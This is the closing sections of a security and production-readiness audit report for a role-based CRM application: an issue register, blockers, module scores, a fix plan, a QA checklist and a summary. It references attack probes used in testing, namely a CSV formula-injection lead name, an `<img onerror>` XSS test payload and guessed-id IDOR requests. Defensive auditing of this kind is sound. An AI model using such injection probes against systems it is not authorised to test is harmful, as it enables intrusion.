| Jobs | 0 queued, 0 processing, 0 stuck >1 h, 0 failed in 24 h | **RUN** |
| Mail sync | 3 accounts, 0 stale | **RUN** |
| Duplicate agent names | 0 | **RUN** |
| Audit write failures | 0 | **RUN** |
| Process | RSS 182 MB, event-loop lag 0 ms, CPU 2 % | **RUN** |
| Migrations (dev + test) | Up to date, 69 migrations | **RUN** |
| Migrations (production) | **NOT VERIFIED** | — |

**The earlier disk-space problem is resolved.** Four e2e failures previously attributed to ENOSPC were an
environment fault, not a code defect, and the space has since been reclaimed.

---

# PART 38 — MASTER ISSUE REGISTER

| ID | Module | Category | Issue | Severity | Role impact | Production impact | Required fix |
|---|---|---|---|---|---|---|---|
| **B-01** | Leads | Security / Bug | CSV formula injection in lead export | Medium | All exporting roles | Formula executes in staff spreadsheet | Add formula guard to `downloadCsv` |
| **I-01** | Database | Configuration | Schema drift — `migrate dev` would drop FKs and indexes | High | All | Silent loss of referential integrity | `migrate deploy` only; reconcile schema |
| **I-02** | Schedulers | Reliability | `RUN_SCHEDULERS` defaults on; no Redis lock | High | All | Duplicate mail/sync on multi-process deploy | Set `RUN_SCHEDULERS=false` on all but one |
| **B-02** | Navigation | Bug / UX | "Client Reviews" nav item with no route | Low | All CRM users | Dead link | Remove from nav, or build the module |
| **I-03** | Architecture | Security (latent) | `ScreenGuard` not global | Medium | Future | A future controller could enforce nothing | Register globally, opt out explicitly |
| **I-04** | Meta | Authorization | CRM/Marketing role refused Meta connect while Agent is allowed | Low | CRM/Marketing | Marketing cannot connect Meta | Product decision |
| **I-05** | Campaigns | Performance | Unbounded audience load, full rows into memory | Low now | All | Degrades at tens of thousands of leads | `select` + batch |
| **I-06** | Tenancy | Data isolation | Multi-tenant isolation never exercised | Medium | All (future) | Unknown at 2nd tenant | Live two-tenant test before onboarding |
| **I-07** | Environment | Configuration | Dev `.env` lacks `MAIL_REDIRECT_TO` | Medium | Developers | Real client mail sent from dev | Set it in all non-production envs |
| **I-08** | Compliance | Data lifecycle | No lead retention policy; 986 soft-deleted leads kept indefinitely | Medium | All | Possible CASL/PIPEDA exposure | Decide and implement retention |
| **I-09** | Tests | Test coverage | No test asserts lead-export formula neutralisation | Low | — | Allowed B-01 to survive | Add with the B-01 fix |
| **I-10** | Operations | Configuration | Outstanding production migrations, `APP_KEY`, credential rotation | High | All | Deployment failure or compromise | Pre-deployment checklist |
| **I-11** | Tests | Test quality | 2 e2e tests are state-dependent — `String(null)` → `"null"` assertion fails on a fresh seed | Low | — | None (test-only; outside CRM scope) | Assert `before.phone ?? ''`, or set the field in the test first |

---

# PART 39 — PRODUCTION BLOCKERS

## CODE BLOCKERS

**None.**

B-01 is a real defect and should be fixed, but it does not prevent safe operation: it requires a hostile lead
submission *and* an export *and* the file being opened in a spreadsheet. It is P1, not P0.

## DATABASE BLOCKERS

1. **Outstanding production migrations must be applied** — verify → back up → `migrate deploy` → verify.
2. **`migrate dev` must never be run against a real database** (I-01).

## SECURITY BLOCKERS

1. **Rotate the previously exposed credentials** (S-05). Removal from a repository is not sufficient once
   exposed.

## CONFIGURATION BLOCKERS

1. **`APP_KEY` present and exactly 32 bytes in production.** Enforced at boot — the app will not start otherwise.
2. **`RUN_SCHEDULERS=false` on every process except one**, if more than one process is deployed (I-02).

## ENVIRONMENT BLOCKERS

**None.** Disk, database, workers, queues and mail sync are all healthy.

## NON-BLOCKING GAPS

B-02 (dead nav), I-04 (Meta/CRM role), I-05 (audience scaling), I-06 (untested tenancy), I-07 (dev mail),
I-08 (retention), I-09 (missing test), advanced Inbox features, Opportunity Management, Google Calendar
categories.

---

# PART 40 — MODULE PRODUCTION READINESS

| Module | Functionality | Reliability | Security | Permissions | Tests | UX | **Readiness** |
|---|---|---:|---:|---:|---:|---:|---:|
| Leads | 97 | 94 | **88** | 98 | 95 | 92 | **93** |
| Calendar | 95 | 92 | 95 | 96 | 93 | 92 | **94** |
| Campaigns | 93 | 88 | 93 | 94 | 92 | 90 | **92** |
| CRM Inbox | 88 | 86 | 94 | 92 | 90 | 90 | **90** |
| Meta | 90 | 85 | 92 | 93 | 88 | 88 | **89** |
| Dashboard | 95 | 94 | 95 | 96 | 90 | 93 | **94** |
| Audit Trail + Export | 98 | 95 | 97 | 98 | 96 | 94 | **96** |
| Notifications | 96 | 93 | 95 | 96 | 94 | 93 | **95** |
| Notification Preferences | 96 | 95 | 96 | 97 | 94 | 92 | **95** |
| Triggers | 92 | 90 | 93 | 95 | 88 | 88 | **91** |
| CRM Settings | 93 | 92 | 95 | 96 | 90 | 90 | **93** |
| Auth / Session / MFA | 96 | 95 | 96 | 97 | 95 | 92 | **95** |
| **Client Reviews** | **0** | — | — | 40 | 0 | **10** | **8** |

## Modules below 85 — explanation

**Client Reviews (8).** Not implemented, yet granted, classified and rendered in navigation. It scores near zero
on functionality because none exists, and 10 on UX because the visible consequence is a dead link. This is
B-02 and needs a product decision, not engineering effort, first.

*Meta (89) and Inbox (90)* sit slightly lower than their peers not because defects were found, but because their
external-provider paths could not be exercised live in this audit. That is an evidence gap, stated honestly,
not a known fault.

---

# PART 41 — ROLE READINESS

| Role | Functional access | Security | Isolation | Workflow completeness | **Overall** |
|---|---:|---:|---:|---:|---:|
| **Super Admin** | 95 | 96 | 97 | 94 | **96** |
| **Admin / Manager** | 88 | 96 | 97 | 88 | **92** |
| **Agent** | 97 | 95 | 98 | 96 | **97** |
| **CRM / Marketing** | 86 | 95 | 97 | 87 | **91** |

**Agent (97)** is the best-served role, which is right for this product: agents own the pipeline, and every
personal CRM workflow was verified working and isolated.

**Admin/Manager (88 functional)** is scored down only for the deliberate policy consequence — a manager sees
zero leads and cannot supervise pipelines in-app. That is the accepted design, not a defect, but it *is* a
functional limitation a manager will feel on day one and should be told about before rollout.

**CRM/Marketing (86 functional)** is scored down for two measured items: refused Meta connection management
(I-04) and the dead Client Reviews link that this role is explicitly granted `edit` on (B-02).

---

# PART 42 — FINAL CRM VERDICT

## ✅ **C. PRODUCTION READY WITH CONDITIONS**

### Why

The CRM is functionally complete for its stated current-version scope and its security fundamentals hold under
adversarial testing. Across **295 live role/route requests** and **36 targeted isolation checks**, no
authentication bypass, no authorization bypass, no IDOR, no injection and no cross-user data exposure was found,
and **not one request produced a 500**. All seven required current-version features are present and verified.
1,398 server tests and the full e2e suite pass.

The conditions below are real but bounded, and none of them is a code defect that prevents safe operation.

### Code blockers
**None.** B-01 (CSV formula injection) is a genuine defect to fix, but it is not a barrier to operating the CRM.

### Security blockers
Rotate the previously exposed credentials before go-live.

### Configuration requirements
`APP_KEY` (32 bytes) and `SESSION_SECRET` — both enforced at boot, so they cannot be got wrong silently.
`RUN_SCHEDULERS=false` on every process but one if deploying more than one process.

### Database requirements
Verify pending migrations, back up, `migrate deploy`, verify. **Never `migrate dev`.**

### Environment requirements
None outstanding — disk, database, workers and mail sync are healthy.

### Non-blocking gaps
Dead Client Reviews navigation; CRM/Marketing Meta permission; campaign audience scaling; untested multi-tenancy;
no lead retention policy; dev environment sends real mail.

### Regression risk
**Low for the CRM itself.** The strongest structural protections are the single `leadScopeWhere` implementation,
the DB-level notification dedupe index, and `tenancy.spec.ts` failing the build on an unclassified table. The
highest regression risk is **operational, not architectural**: one wrong migration command or one missing
`RUN_SCHEDULERS` flag.

---

# PART 43 — PRIORITY ACTION PLAN

## P0 — MUST FIX BEFORE PRODUCTION

| Priority | Module | Issue | Required change | Likely files | Risk | Required tests |
|---|---|---|---|---|---|---|
| P0 | Database | Outstanding migrations | Verify → back up → `migrate deploy` → verify | `prisma/migrations/` | Low if `deploy` | Post-deploy `migrate status` |
| P0 | Config | `APP_KEY` in production | Set, 32 bytes | env | None — boot-enforced | Boot check |
| P0 | Security | Rotate exposed credentials | Rotate all; note DB-stored ones | env + `mail_accounts` | Medium — plan reconnects | Connectivity smoke test |
| P0 | Schedulers | Multi-process duplication | `RUN_SCHEDULERS=false` on all but one | deploy config | Low | Confirm one process logs sweeps |

## P1 — REQUIRED CURRENT VERSION

| Priority | Module | Issue | Required change | Likely files | Risk | Required tests |
|---|---|---|---|---|---|---|
| P1 | Leads | **B-01** CSV formula injection | Add formula guard; ideally move CSV writing server-side to reuse the audit writer | `client/src/desk/LeadsPage.tsx` | Very low | Unit + e2e formula neutralisation |
| P1 | Navigation | **B-02** Client Reviews dead link | Product decision, then remove from nav **or** build it | `DeskLayout.tsx`, `area.ts`, `domain.ts` | Low — change `area.ts` and `domain.ts` together | `audit-domain.spec.ts` |

## P2 — SECURITY / RELIABILITY

| Priority | Module | Issue | Required change | Likely files | Risk | Required tests |
|---|---|---|---|---|---|---|
| P2 | Architecture | **I-03** ScreenGuard not global | Register globally, explicit opt-out | `app.module.ts`, guards | **Medium — touches every controller** | Full authorization suite |
| P2 | Database | **I-01** Schema drift | Reconcile `schema.prisma` with migration history | `prisma/schema.prisma` | Medium | `migrate diff` returns empty |
| P2 | Tenancy | **I-06** Untested isolation | Live two-tenant test before onboarding a 2nd brokerage | test fixtures | Low | Cross-tenant denial across all CRM surfaces |
| P2 | Environment | **I-07** Dev sends real mail | Set `MAIL_REDIRECT_TO` in dev/staging | env | None | Confirm mail lands in sink |
| P2 | Compliance | **I-08** Lead retention | Decide policy; implement or document as manual | policy + `leads` | Low | Retention job test if built |

## P3 — UX / PERFORMANCE

| Priority | Module | Issue | Required change | Likely files | Risk | Required tests |
|---|---|---|---|---|---|---|
| P3 | Campaigns | **I-05** Audience scaling | Add `select`, batch the suppression lookup | `campaign-audience.service.ts` | Low | Large-audience performance test |
| P3 | Meta | **I-04** CRM role permission | Product decision on Meta management | `permission.service.ts` | Low | Role matrix test |
| P3 | Tests | **I-11** state-dependent H7 tests | Assert `before.phone ?? ''`, or set the field in the test first | `e2e/tests/settings-high-fixes.spec.ts` | None | The same 3 tests on a fresh seed |
| P3 | Docs | `docs/audit/` untracked | Commit the audit history | `.gitignore` | None | — |

## FUTURE VERSION

Opportunity Management · Google Calendar selection/categories · Inbox drafts, forwarding, threading ·
System-wide compliance lead search (would require revisiting the privacy policy)

---

# PART 44 — REGRESSION CHECKLIST FOR QA

## Authentication
- [ ] Login by username; by email; mixed case
- [ ] Wrong password → generic message, no user enumeration
- [ ] Unknown user → same message and timing
- [ ] Lockout triggers; unlock after the window
- [ ] Session id **changes** on login (fixation)
- [ ] Logout invalidates; old cookie rejected
- [ ] Write without CSRF → 419
- [ ] Session survives an app restart

## MFA
- [ ] TOTP enrol → confirm → login challenge
- [ ] Email OTP; SMS OTP
- [ ] Invalid / expired / reused code refused
- [ ] Recovery code works once, then is refused
- [ ] Trusted device skips challenge; revoke-all clears it
- [ ] Admin reset; admin policies (needs `users` screen)
- [ ] With `APP_KEY` unset, TOTP enrolment is **refused**, not stored in plaintext

## Dashboard
- [ ] Loads for all four roles
- [ ] Lead count **equals** the Leads screen count for the same user
- [ ] Task tile equals the Lead Tasks panel beneath it
- [ ] Empty, loading and error states
- [ ] No value changes when another user adds a lead

## Leads
- [ ] List, paginate, sort, search; multiple filters together
- [ ] Create valid; reject missing name/email, bad email, bad `lead_source`
- [ ] Duplicate email — same case and different case
- [ ] Whitespace, very long values, unicode, emoji
- [ ] Edit every field; notes, tasks, showings, calls, SMS, email, tags
- [ ] Bulk select and delete
- [ ] Import: valid CSV, missing columns, duplicate rows, bad formatting, large file, interrupted
- [ ] Delete → gone from list → restore → child data intact
- [ ] Export: correct rows, capped, **truncation warning shown**
- [ ] **Export a lead whose name begins with `=` → the cell must be neutralised** *(new — B-01)*

## Leads — isolation *(run as Agent A against Agent B's data)*
- [ ] Open by URL; by direct API; guessed id; `0`, `-1`, `2147483647`, `abc`
- [ ] Edit, delete, permanent purge
- [ ] Add note, task, showing, call, SMS, email, tag
- [ ] Bulk delete including their id
- [ ] **CSV export contains only your own leads**
- [ ] Repeat as Admin, CRM and Super Admin — all must be refused

## Meta
- [ ] Connect, disconnect, reconnect
- [ ] Invalid state; reused nonce
- [ ] Expired and revoked token → "reconnect", not a 500
- [ ] Webhook with bad signature → 403
- [ ] Manual sync; scheduled sync
- [ ] Same submission via poll **and** webhook → **one** lead, **one** notification
- [ ] Data-deletion callback
- [ ] With `APP_KEY` unset → status reports it as a blocker

## Campaigns
- [ ] Create, edit, delete, cancel
- [ ] Audience by tag/filter; template with attachments
- [ ] Immediate send; scheduled send; large send
- [ ] Duplicate-send protection; restart mid-send resumes
- [ ] Opens, clicks, link rewriting
- [ ] Soft bounce retries; hard bounce suppresses
- [ ] Unsubscribe works; invalid token shows "Invalid link"
- [ ] Completed and Failed notifications arrive
- [ ] Another user's template is not reachable

## Calendar
- [ ] Day / week / month; "+X more"
- [ ] Create, edit, delete; invalid type refused
- [ ] Weekly, monthly, interval recurrence; until date
- [ ] Month-end (31st) and leap-year dates
- [ ] Edit/delete single occurrence vs whole series
- [ ] To-dos; reminders fire
- [ ] **Agent A cannot see, open or edit Agent B's event**
- [ ] Google connect, sync, disconnect; local edits preserved

## Inbox
- [ ] Account config; Gmail OAuth; IMAP; SMTP
- [ ] Polling brings new mail; search; pagination
- [ ] Read/unread and the unread count follow
- [ ] Attachments; lead matching; send and reply
- [ ] **Body renders as text, never HTML**
- [ ] Times shown in local time
- [ ] **Agent A cannot read Agent B's mail by id**
- [ ] New-mail notification respects preferences

## Triggers, Settings, Audit
- [ ] Triggers reachable by Agent and CRM; other Settings sections refused
- [ ] Settings save valid; reject invalid; cross-user write refused
- [ ] `PUT /api/account/settings` writes **only** the caller's row
- [ ] Audit: listing, search, date/user/action/category filters, pagination, detail
- [ ] Audit shows CRM entries only in the CRM area
- [ ] Agent and CRM refused the audit trail

## Audit export
- [ ] CSV and Excel download with `attachment` headers
- [ ] Current filters preserved; correct records; CRM only
- [ ] Empty export; large export; truncation headers
- [ ] Sensitive fields redacted
- [ ] **Formula-leading values neutralised**
- [ ] Anyone refused the listing is refused the export

## Notifications
- [ ] Centre lists; unread count; mark read; mark all read; history; links open the right record
- [ ] All six CRM events fire to the right recipient
- [ ] Actor is **not** notified of their own action
- [ ] All channels on / all off / email only / push only / in-app only
- [ ] Same event twice → **one** notification
- [ ] Restart the app, re-run the scheduler → still one
- [ ] A failing mail server does **not** fail the lead save
- [ ] Agent A cannot read or mark Agent B's notification

## Roles, permissions, isolation
- [ ] Full role matrix (§2) reproduced
- [ ] Every UI-hidden action also refused by direct API call
- [ ] Anonymous request to every CRM route → 401
- [ ] Tenant isolation, when a second tenant exists

## Error handling, integrations, performance, background jobs
- [ ] Invalid form, expired session, invalid CSRF, unauthorized op
- [ ] Meta / Gmail / SMTP / IMAP / Google / Twilio / push failures — no 500, no data loss, no double-processing
- [ ] DB constraint violation surfaces cleanly
- [ ] Lead list, search, dashboard, audit export at volume
- [ ] `/api/health/ready` and `/api/health/workers` green
- [ ] **Exactly one process runs schedulers**
- [ ] No duplicate reminders after a restart

---

# PART 45 — EXECUTIVE SUMMARY

## CRM Overall Score

# **92 / 100**

## Production Verdict

### ✅ PRODUCTION READY WITH CONDITIONS

Functionally complete for its current-version scope, with security fundamentals that held under adversarial
testing. The conditions are operational — migrations, secrets, and one scheduler flag — plus one code defect
worth fixing in the first patch.

## Role readiness

| Role | Score | Position |
|---|---:|---|
| **Super Admin** | 96 | Ready |
| **Admin / Manager** | 92 | Ready — brief them that they cannot see agents' leads by design |
| **Agent** | 97 | Ready — the best-served role, correctly |
| **CRM / Marketing** | 91 | Ready — two small permission/navigation gaps |

## Issues

- **Critical:** 0
- **High:** 0 code · 3 operational (migrations, credential rotation, scheduler flag)
- **Medium:** 5 — B-01 CSV injection · I-01 schema drift · I-03 ScreenGuard not global · I-06 untested tenancy · I-07 dev sends real mail
- **Low:** 6 — B-02 dead nav · I-04 Meta role · I-05 audience scaling · I-08 retention · I-09 missing test ·
  I-11 state-dependent tests

## Required current-version gaps

**None.** Audit Export and all six CRM event notifications are present and verified. Lead Task Due was proven by
a live scheduler run, including that a muted user's task was processed while no notification was sent.

## Production configuration requirements

`APP_KEY` (32 bytes) · `SESSION_SECRET` · `COOKIE_SECURE=true` · https `FRONTEND_URL` — all four are enforced at
boot and cannot be got wrong silently. Plus `RUN_SCHEDULERS=false` on every process but one.

## Existing functionality at risk

The two things that could break working functionality are both **one command or one flag**: running
`prisma migrate dev` against a real database (drops foreign keys and indexes), and deploying multiple processes
without `RUN_SCHEDULERS=false` (duplicate client email). Neither is a code defect; both are avoidable by
procedure.

## Top 10 actions before production

1. Verify pending production migrations → **back up** → `migrate deploy` → verify. Never `migrate dev`.
2. Confirm `APP_KEY` is present and exactly 32 bytes in production.
3. Rotate every previously exposed credential — including the ones stored in the database, not just in env.
4. Set `RUN_SCHEDULERS=false` on every process except one.
5. Fix **B-01** — the lead export formula guard, with a test.
6. Decide **B-02** — remove the Client Reviews nav item, or build the module.
7. Set `MAIL_REDIRECT_TO` in development and staging so no test mail reaches a client again.
8. Brief managers that they cannot see agents' leads, and add ownership transfer to the offboarding checklist.
9. Confirm `SESSION_SECRET`, `COOKIE_SECURE` and the public URLs in production.
10. Decide the lead retention position — 986 soft-deleted leads are currently kept forever.

## Features safe to defer

Opportunity Management · Google Calendar selection/categories · Inbox drafts, forwarding and threading ·
Client Reviews as a CRM module · Redis (only needed for multi-process or scale) · system-wide compliance lead
search.

---

## What this audit changed, and where

**No application code, schema, migration, test, permission, configuration or production data was modified.**

Confined entirely to the disposable **`myapp_test`** database, all of it re-creatable by
`node server/scripts/seed-test-env.cjs`:

- Probe leads, tasks, calendar events and a campaign template, created to test isolation
- One lead named with a spreadsheet formula, created to demonstrate **B-01**
- One lead named with an `<img onerror>` payload, created to test the campaign-preview XSS path
- `company_settings.phone` and `.account_no` set to non-null values, to prove the **I-11** diagnosis
- The database was re-seeded once mid-audit to recover a contaminated environment

The development database (`myapp`) was read but never written. The development server was restarted, which is
why it is currently stopped — start it with `npm run start:dev` in `server/`.

---

**Audit performed:** 2026-08-06 · **Application modified:** No · **Committed:** No
**Note:** `docs/audit/` is untracked in git — this report has no version-control safety net until it is committed.
